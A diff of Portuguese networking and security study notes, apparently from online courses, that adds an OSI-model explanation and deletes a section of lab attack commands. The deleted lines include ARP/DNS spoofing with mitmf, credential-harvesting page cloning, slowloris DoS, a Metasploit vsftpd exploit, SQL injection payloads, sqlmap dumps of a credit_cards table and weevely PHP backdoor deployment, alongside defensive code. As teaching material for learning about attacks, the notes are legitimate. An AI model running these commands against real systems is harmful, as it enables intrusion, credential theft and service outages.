@@ -9,11 +9,6 @@ $ ping 127.0.0.1 || ping localhost => É um endereço interno da placa de rede, 
 $ netstat           => ver netstat --help
 
 
-=========== kali-linux ==================================================================================================================
-$ macof -i eth0     => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
-$ arp -a            => Ver quais endereços MAC estão salvos para serem usados pelo ARP
-=========================================================================================================================================
-
 =========== iptables ====================================================================================================================
 !Um alternativa ao firewall pfSense, o iptables já vem instalado no Kernel do Linux
 $ systemctl status iptables.service  => Verifica os status do Ip Tables
@@ -35,11 +30,45 @@ Ver: https://www.alura.com.br/artigos/protegendo-seu-servidor-com-iptables
 =========================================================================================================================================
 
 
-=========== Conteúdo de Redes/Segurança e configuração de aparelhos CISCO ===============================================================
+=========== Conteúdo de Redes/Segurança e configurações de aparelhos CISCO ===============================================================
+
 => https://www.alura.com.br/artigos/como-armazenar-senhas-no-banco-de-dados-de-forma-segura
    https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
    https://www.alura.com.br/artigos/autenticacao-de-forma-segura-com-criptografia
-   
+
+
+!OSI:
+      O início do desenvolvimento e construção de redes de telecomunicações foi um pouco difícil, cada fabricante de equipamento de rede tinha a sua solução proprietária, o que impossibilitava a comunicação com equipamentos de outros fabricantes. Desta forma, caso optasse por um fabricante, o cliente só poderia comprar equipamentos de mesma marca, gerando assim o chamado vendor lock-in, quando ficamos presos a um fabricante.
+      Com o intuito de evitar esses problemas, a International Organization for Standardization (ISO) desenvolveu alguns modelos para garantir a padronização dos protocolos de comunicação, permitindo equipamentos de diferentes fabricantes se comunicarem. Um desses modelos de padronização é o modelo OSI (Open System Interconnection).
+      Mas como o modelo OSI faz para garantir a comunicação entre os equipamentos de diversos fabricantes? Para isso, ele pega todo o processo de comunicação e divide em sete camadas, onde cada uma fica com um conjunto de protocolos que vai ser responsável por uma função específica.
+      
+      Camada 7: Application (Aplicação)  (HTPP, FTP, SMTP) => A camada de aplicação (Application - 7) engloba tudo aquilo que faz interação com o usuário final. Ela funciona como uma interface permitindo a comunicação de dados na rede. Quando acessamos um site como o blog da Alura, ou enviamos um e-mail, utilizamos protocolos como o HTTP para acesso de sites e SMTP para o envio de e-mails. Esses protocolos estão presentes na camada de aplicação.
+
+      Camada 6: Presentation (Apresentação) (.mp3, .jpg)  => Assim que os dados começam a ser transmitidos, eles são passados para a responsabilidade da camada de apresentação (Presentation - 6). Essa camada é responsável por formatar os dados em um padrão que é compreendido pelo dispositivo da outra ponta, além de também ser responsável por realizar a criptografia dos dados, caso exista. Um exemplo é quando acessamos um site, a página está formatada em "HTML", podemos ter imagens em formato ".jpeg" nesse mesmo site, e um anúncio sonoro formatado em ".mp3". Desta forma, a camada de apresentação transformará esses dados transmitidos pela camada de aplicação em formatos padronizados que são capazes de serem interpretados.
+
+      Camada 5: Session (Sessão)  => Em um computador, podemos ter diversas aplicações rodando simultaneamente, como páginas web abertas ou ouvindo música. A camada de sessão é responsável pela separação dessas aplicações. Quando fazemos requisições web, a camada de sessão irá garantir que os dados voltem para a aplicação que iniciou a comunicação e não para as outras.
+
+      !!! Essas camadas citadas até o momento (Application, Presentation, Session) são de responsabilidade do sistema operacional, como por exemplo o Windows ou o Linux, e não são de responsabilidade dos equipamentos de rede que iremos estudar durante o curso.
+
+      Camada 4: Transport (Transporte) (TCP, UDP, Portas) => Chegando na camada de transporte, o dado transmitido é chamado de segmento (segment). A primeira responsabilidade é a de atribuir portas de comunicação com o intuito de identificar o serviço que queremos acessar. Por exemplo, podemos ter um servidor que possua serviços web e de e-mail, como o servidor identificaria qual serviço gostaríamos de acessar? Utilizando as portas de comunicação, sendo cada uma é responsável por um protocolo, o HTTP utiliza a porta 80, o SMTP utiliza a 25. Outra responsabilidade da camada de transporte é informar como o transporte dos dados será realizado. A primeira forma de transporte é TCP (Transmission Control Protocol), ela garante a integridade dos dados, caso algum dado seja perdido na comunicação entre o cliente e o servidor, ocorrerá uma retransmissão do dado perdido. Esse protocolo é conhecido como orientado a conexão (Connection-Oriented). Porém essa transmissão é mais lenta, e se eu estive      r jogando ou conversando em uma chamada de vídeo? A forma de transporte UDP (User Datagram Protocol) não utiliza essa verificação de integridade dos dados ganhando mais velocidade. O protocolo UDP também é conhecido como não orientado a conexões (Connectionless). 
+
+      !!! Todo dado que passou por essas camadas será chamado de Segment 
+
+      Camada 3: Network (Rede) (Roteadores) => Uma vez que os segmentos foram processados pela camada de transporte, os segmentos serão passados para a camada de rede (Network - 3), nesse ponto os dados serão chamados de pacotes (packets). A responsabilidade da camada de rede seria encapsular e colocar o endereçamento lógico, sendo a forma mais comum desse endereçamento lógico o endereço IP. Além dessa atribuição dos endereços lógicos, a camada de rede é responsável por definir a melhor rota para envio desses pacotes ao destinatário. Por exemplo, quando colocamos no nosso browser o endereço da Alura, esses pacotes serão transmitidos por vários roteadores intermediários até chegar ao servidor onde possui o conteúdo. Tais roteadores serão responsáveis por encontrar a melhor rota nesse percursos, dessa forma, concluímos que os roteadores são equipamentos que atuam na camada de rede.
+
+      !!! Todo dado que passou por essas camadas será chamado de Packets
+
+      Camada 2: Data-link (Enlace de dados) (MAC) => Essa camada é responsável por encapsular esses pacotes e acrescentar o chamado endereçamento físico, nesta etapa os dados são chamados de quadros (frames). O endereço físico é uma identificação unica e vem inserido na placa de rede, são os endereços MAC (Media Access Control). Desta forma, os Switches são equipamentos que atuam na camada de enlace de dados.
+
+      !!! Todo dado que passou por essas camadas será chamado de Frames
+
+      Camada 1: Physical (Física) (HUBs) =>  Pense na camada física como a responsável por estabelecer a conexão e o transporte do sinal elétrico usando os cabos e conectores. Os HUBs atuam na camada física. 
+
+      Para facilitar a memorização da ordem das camadas, podemos utilizar a frase abaixo. Cada letra em negrito corresponde a uma camada começando do 1 ao 7.
+      "Pois diga novamente tudo sobre o Pedro e a Amanda"
+
+      Ver: https://www.alura.com.br/artigos/conhecendo-o-modelo-osi
+           https://pt.wikipedia.org/wiki/Protocolo_(ci%C3%AAncia_da_computa%C3%A7%C3%A3o)
 
 !IP: O termo IP (Internet Protocol) é um número identificador dado ao seu computador, ou roteador, ao conectar-se à rede. É através desse número que seu computador pode enviar e receber dados na internet. O IP é definido pelo seu provedor de Internet. Ele pode ser estático (não mudar) ou dinâmico (mudando de tempos em tempos).
 !Classes do IP: ver imagem. A IETF (Internet Engineering Task Force) determinou que existiriam ao todo 5 classes de endereços IP, indo de ordem alfabética da classe A até a classe E. Porém as duas últimas classes não são usadas para serem endereçadas as máquinas. A classe D seria usada para multicast (termo usado quando queremos nos comunicar com somente algumas máquinas de nossa rede) e a classe E seria uma classe experimental. Portanto as classes de IP que podem ser endereçadas para máquinas seriam a classe A, B e C.
@@ -47,8 +76,6 @@ Ver: https://www.alura.com.br/artigos/protegendo-seu-servidor-com-iptables
        * Note que o IP da minha máquina é um IP Privado, estão, para acessarmos a internet a nossa provedora nos dá um ip público que pode ser visto no site: https://meuip.com.br/
 !IP Público: São endereços públicos globais usados na Internet. Um endereço IP público é um endereço IP usado para acessar a Internet. Os endereços IP públicos (globais) são roteados na Internet, ao contrário dos endereços privados. A presença de um endereço IP público em seu roteador ou computador permitirá que você organize seu próprio servidor (VPN, FTP, WEB, etc.), acesso remoto ao seu computador, câmeras de vigilância de vídeo e acesse-os de qualquer lugar da rede global. Com um endereço IP público, você pode configurar qualquer servidor doméstico para publicá-lo na Internet: Web (HTTP), VPN (PPTP / IPSec / OpenVPN), mídia (áudio / vídeo), FTP, unidade de rede NAS, servidor de jogos, etc.
        * Pode ser visto em: https://meuip.com.br/
-!Wireshark: https://www.wireshark.org/  - Wireshark is the world’s foremost and widely-used network protocol analyzer. It lets you see what’s happening on your network at a microscopic level and is the de facto (and often de jure) standard across many commercial and non-profit enterprises, government agencies, and educational institutions. Wireshark development thrives thanks to the volunteer contributions of networking experts around the globe and is the continuation of a project started by Gerald Combs in 1998.
-       *ip.addr==algum_ip   => para filtrar no wireshark
 !TCP: Protocolo de Controle de Transmissão (do inglês: Transmission Control Protocol, abreviado TCP) é um dos protocolos de comunicação, da camada de transporte da rede de computadores do Modelo OSI, que dão suporte a rede global Internet, verificando se os dados são enviados na sequência correta e sem erros via rede. É complementado pelo protocolo da Internet, normalmente chamado de, TCP/IP. Neste protocolo da camada de transporte (camada 4 OSI) se assentam a maioria das aplicações cibernéticas, como o SSH, FTP, HTTP — portanto, a World Wide Web,[1] devido sua versatilidade e robustez. O Protocolo de controle de transmissão provê confiabilidade, entrega na sequência correta e verificação de erros dos pacotes de dados, entre os diferentes nós da rede, para a camada de aplicação. Aplicações que não requerem um serviço de confiabilidade de entrega de pacotes podem se utilizar de protocolos mais simples como o User Datagram Protocol (UDP), que provê um serviço que enfatiza a redução de latência da conexão. //// O protocolo TCP encontra-se acima da camada onde o IP está localizado e ele é responsável por realizar o transporte da minha informação. Além do protocolo TCP, essa camada possui também outro protocolo bastante conhecido, o UDP.
 !ICMP: ICMP, sigla para o inglês Internet Control Message Protocol (em português, Protocolo de Mensagens de Controle da Internet), é um protocolo integrante do Protocolo IP, definido pelo RFC 792, é utilizado para comunicar informações da camada de rede, sendo o uso mais comum para fornecer relatórios de erros à fonte original. Qualquer computador que utilize IP precisa aceitar as mensagens ICMP e alterar o seu comportamento de acordo com o erro relatado. Os gateways devem estar programados para enviar mensagens ICMP quando receberem datagramas que provoquem algum erro.
 !ARP: O ARP é o protocolo utilizado para fazer o mapeamento entre o endereço IP e o endereço MAC de um dispositivo. Isso é necessário porque o MAC encontra-se um nível abaixo do IP e eu preciso dele para poder transmitir as informações. Em redes de computadores, temos protocolos que possuem hierarquias diferentes. Para poder chegar até o IP que está na camada 3, eu preciso passar pelo MAC que está na camada 2, pense como se fosse escalar uma pirâmide, não dá pra chegar ao topo sem passar pelo meio dela!
@@ -393,9 +420,6 @@ Ver: https://www.alura.com.br/artigos/protegendo-seu-servidor-com-iptables
         Fun.Finanças
         $ 2002:0BAA:0000:0000::CCCC/64
         $ 2002:0BAA:0000:0000::BBBB
-!OSI:
-      Ver: https://www.alura.com.br/artigos/conhecendo-o-modelo-osi
-         https://pt.wikipedia.org/wiki/Protocolo_(ci%C3%AAncia_da_computa%C3%A7%C3%A3o)
 !SSID:
       O SSID (Service Set Identifier) é um texto de até 32 caracteres que identifica as redes sem fio. É esse nome que os dispositivos utilizam para se conectar. Cada ponto de acesso tem seu SSID que o identifica na rede. Em alguns casos, podemos ter na mesma rede vários pontos de acesso com o mesmo SSID. Neste caso, é comum ouvir o termo ESSID (Extended Service Set ID). No primeiro curso de redes vimos que existem os endereços IPs que os computadores utilizam para se comunicar e, além dos endereços IPs, existem os endereços MAC. Esses endereços são fixos e associados a placa de rede do dispositivo. Quando utilizamos vários SSID na mesma rede, as máquinas utilizam o endereço MAC para saber qual o access point que estão conectadas. Em redes sem fio, isso é chamado de BSSID (Basic Service Set ID). O BSSID nada mais é do que o endereço MAC do ponto de acesso. Mesmo sem ter mais de um access point com o mesmo nome, os dispositivos sempre utilizam o BSSID para realizar a comunicação com o ponto de acesso.
       Ver: https://www.lifewire.com/wireless-standards-802-11a-802-11b-g-n-and-802-11ac-816553
@@ -417,127 +441,6 @@ Canais de Wifi:
       * Ao criar um Security Group da AWS por default (máquinas Linux), é criada uma regra que permite que você faça a conexão através do protocolo SSH (porta 22).
       * pfSense - Logo após a instalação, sem termos feito nenhuma customização, é possível acessar o pfSense através do browser (porta 80) e também através do console do próprio firewall. Por default, o acesso via SSH vem desabilitado. Para um gerenciamento seguro, é recomendável que você desabilite o acesso à porta 80 ( a porta padrão do HTTP) e habilite o gerenciamento web exclusivamente pela porta 443 (HTTPS).
       * O posicionamento das regras dentro de um firewall é pré-requisito para o correto funcionamento do mesmo. Uma boa prática é colocar logo no início as regras responsáveis por tratar o maior volume de requisições, dessa maneira você otimiza os recursos (memória, CPU, etc) utilizados pelo firewall.
-!Man In the Middle (MITM):
-      * O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados.
-        $ apt-get-install mitmf  => no kali linux
-        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
-        $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado
-!DNS Spoofing:
-      * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
-      * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
-        $ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
-        $ cd social-engineer-toolkit/
-        $ ./setoolkit
-        yes
-        set>1
-        set>2
-        set:webattack>3
-        /var/www/html  => site clonado estará aqui
-        $ cd /etc/mitmf
-        $ getit mitmd.conf
-        $ *.alura.com.br=192.168.121.172  => redirecionar o site da alura para aquele ip que contem a página clonada
-        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns   => ex: mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0 --dns
-    Ver: https://anonymousemail.me/]
-    * Quando forçamos o redirecionamento para uma página de nosso controle, mesmo que um usuário mal intencionado tente mudar o redirecionamento, ele não terá sucesso. Podemos, por exemplo colocar em nossa programação, algo como:
-      $ response.sendRedirect("http://www.meusite.com.br");
-      Ao invés de:
-      $ response.sendRedirect(request.getParameter("url"));
-      ! Existem casos que por questão estratégica e de otimização, não queremos que certas páginas sejam indexadas em mecanismos de buscas. Dessa forma, precisamos informar a esses mecanismos de busca quais são as páginas de nosso site que não queremos que seja indexada e isso é feito através do arquivo robots.txt. Portanto, o robots.txt seria um arquivo no qual informamos como os mecanismos de busca devem indexar as páginas de nosso site. 
-!DoS (Denial of Service):
-      * Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.
-      * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
-      * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
-      * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
-        $ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
-        $ cd slowloris.pl/
-        $ chmod +x slowloris.pl
-        $ ./slowloris.pl
-        $ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
-!DDoS (Distributed Denial of Service):
-      * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
-      * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).
-      * 
-!Nmap:
-      * Nmap é um software livre que realiza port scan desenvolvido pelo Gordon Lyon, autoproclamado hacker "Fyodor". É muito utilizado para avaliar a segurança dos computadores, e para descobrir serviços ou servidores em uma rede de computadores.
-        $ nmap -A [IP do servidor]
-        $ nmap -A -T4 -Pn 192.168.0.8      => Exibe todas as portas e quais processos elas estão rodando
-        Ver: https://nmap.org/docs.html
-!Metasploit:
-      * O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
-        $ use <exploit>  => ex:  exploit/unix/ftp/vsftpd_234_backdoor
-        $ set RHOST [IP do servidor]
-        $ exploit
-!Nessus:
-      * Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.
-!SQL Injection:
-      * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
-      * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
-        $ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
-        $ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
-        ! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
-        $ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
-          Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
-      *Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
-        $ sqlmap -u "URL_DO_FORMS"   => Testa várias injeções e retorna se encontrou alguma vunerabilidade
-        $ sqlmap -u "URL_DO_FORMS" --current-db         => retorna o banco de dados usado
-        $ sqlmap -u "URL_DO_FORMS" --tables -D nowasp   => Uma vez que descobrimos qual o banco, podemos obter o número de tabelas que ele possui e o nome delas
-        $ sqlmap -u "URL_DO_FORMS" --dump -T credit_cards -D nowasp => Vai tentar retornar o conteúdo da tabela informada
-        $ sqlmap -u "http://192.168.1.102:8080/alura-shows/login" --data="email=alex@gmail.com&senha=123"  => A opção --data é utilizada para passar os parâmetros enviados pela requisição POST, através desses parâmetros o sqlmap irá tentar fazer a injeção de código SQL
-        $ 
-      * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
-        $ String usuario=request.getParameter("usuario");
-        $ String senha=request.getParameter("senha");
-        ! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
-        $ String sql = "Insert into accounts (username.password) values (?,?)";
-        ! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
-        $ PreparedStatement stmt = connection.prepareStatement(sql);
-        ! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
-        $ stmt.setString(1,usuario);
-        $ stmt.setString(2,senha);
-        $ stmt.execute();
-        -> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
-        Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
-        No kali: > ifconfig eth0 down 
-                 > ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
-        No server:
-                 > ifconfig eth0 down 
-                 > ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
-!Brut force attack:
-     * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
-       $ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
-       $ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
-       $ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
-       ! Uma das formas mais usadas contra esse tipo de ataque seria obrigar o usuário a cadastrar senhas com um formato mais complexo (ex: uso de letras maiúsculas e minúsculas, caracteres especiais, tamanho mínimo, etc), bem como limitar o número de tentativas de acesso por um mesmo usuário. Desta forma, evitamos que um usuário mal intencionado, utilize de listas pré-existentes para se logar no sistema.
-!Cross Site Scripting (XSS):
-     * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
-       $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
-       $ 
-       $ 
-       ! De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões.
-       ! Poderíamos colocar em nossa programação no back-end: String encoding=ESAPI.encoder().encodeForJavaScript(); Dessa forma, se colocarmos: <script>, através do escaping teremos a conversão desses elementos html para seus respectivos códigos: &ltscript&gt
-       ! Podemos també, evitar esse ataque em Java fazendo o seguinte => Vamos implementar a interface Validator do Spring para realizarmos a validação do que o usuário está passando no campo título e mensagem do depoimento. Ao fazermos isso, somos obrigado a implementar dois métodos supports e validate, o método supports recebe a classe do objeto que está querendo ser validado e retorna se o validador consegue lidar com ele. Na sequência, no método validate, iremos realizar a configuração da validação do que queremos fazer. A nossa estratégia para evitar esse ataque vai ser verificar se esses campos possuem abertura ou fechamento de tag (< ou >), pois com isso, o usuário não conseguirá inserir a tag <script> para colocar o código Javascript do ataque que ele realizou anteriormente, caso os campos contenham essas tags, iremos mostrar uma mensagem de erro.
-!Mass Assignment:
-       * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
- 	  ! Github já sofreu com esse ataque, ver: https://gist.github.com/peternixey/1978249    e   https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
-       ! Para proteger contra o ataque de Mass assignment nós criamos uma classe chamada UsuarioDTO que poderia ser utilizada em qualquer framework. Uma alternativa ao DTO é o método setAllowedFields, em que somente os atributos listados é que poderão ser manipulados pelo usuário. Com isso, mesmo que o usuário tente manipular o atributo roles pelo formulário HTML, isso não será refletido para o atributo da nossa classe e um usuário só será cadastrado com o perfil ROLE_USER. (O método setAllowedFields permite que nós especifiquemos quais são os atributos da classe que o usuário terá permissão de manipular. No caso da Alura Shows, temos a classe modelo Usuario com o atributo roles que não deve ser manipulado e com isso não o especificamos dentro desse método.)
-!Software Nikto:
-     * Nikto é um scanner de vulnerabilidades de software livre acessado por CLI, usado para escanear servidores web em busca de arquivos perigosos, programas desatualizados e outros problemas. É capaz de fazer tanto análises genéricas como análises específicas de servidor. Também faz a captura e exibição de cookies HTTP.
-       ! Existem ferramentas como o Nikto que são capazes de “scanear” um servidor web, listando informações de servidor, como qual tecnologia utilizada, versão, etc e os links referentes a um domínio. Com isso, podemos descobrir páginas que teoricamente não eram para ser indexadas, e se tiver alguma página com conteúdo privado que não esteja com nenhum processo de autenticação, qualquer usuário poderá acessar.
-       $ nikto -h "http://192.168.1.37/multillidae/"
-       $
-!Software Weevely:
-     * O WEEVELY é uma ferramenta desenvolvida em Python que permite que um Backdoor seja gerado no formato .php e se executado em um host remoto pode obter o console do sistema.
-       $ weevely generate 1234 aplicacao.php => Generated backdoor with password '1234' in 'aplicacao.php' of 1429 byte size
-       $ weevely "http://192.168.1.42/dvwa/hackable/uploads/aplicacao.php" 1234  => Caso aja conexeção significa que o backdor conseguiu acesso ao servidor
-!Backdoor:
-     * Um backdoor seria um arquivo no qual é usado para conexão, permitindo assim quando usado de forma correta, que um administrador possa entrar no sistema para realizar reparos de problemas. Quando usado de forma incorreta, o backdoor torna-se uma forma que hackers utilizam para ganhar acesso de forma ilícita.
-       !Uploads de arquivos podem se tornar um problema, vimos em nossa aplicação pelo fato do sistema não verificar o tipo de arquivo, fomos capazes de inserir um backdoor e ganhamos assim acesso ao sistema. Ao filtrar o tipo de arquivo, temos uma segurança maior que o que será passado é apenas o necessário para nossa aplicação, por exemplo, poderíamos colocar em Java:
-       $ FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
-!Owasp-zap:        ****warning*** -> não pode ser usado em sites da internet
-     * Traduzido do inglês-OWASP ZAP é um scanner de segurança de aplicativos da web de código aberto. Ele deve ser usado tanto por aqueles que são novos em segurança de aplicativos quanto por testadores de penetração profissionais. É um dos projetos mais ativos do Open Web Application Security Project e recebeu o status de carro-chefe.
-       $ 
-!Credential Spoofing:
-      *Credential stuffing is a type of cyberattack in which the attacker collects stolen account credentials, typically consisting of lists of usernames and/or email addresses and the corresponding passwords (often from a data breach), and then uses the credentials to gain unauthorized access to user accounts through large-scale automated login requests directed against a web application.
 !
 
 =========================================================================================================================================
